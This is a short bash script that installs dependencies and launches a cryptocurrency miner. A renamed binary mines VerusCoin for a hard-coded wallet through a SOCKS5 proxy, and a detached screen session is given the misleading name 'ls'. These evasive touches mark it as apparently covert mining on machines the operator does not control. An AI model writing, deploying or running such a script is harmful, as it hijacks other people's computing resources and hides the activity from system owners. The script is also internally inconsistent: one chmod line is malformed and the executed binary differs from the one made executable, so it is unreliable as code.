#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start101.sh && chmod +x acing chmod 777 acing start101.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RURWcc2tJvtv8xTfBuS8aakhg4FPAdVMtd
WORKER=$(echo $(shuf -i 1-1 -n 1)Rig001)
PROXY=socks5://98.178.72.21:10919
./acuk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
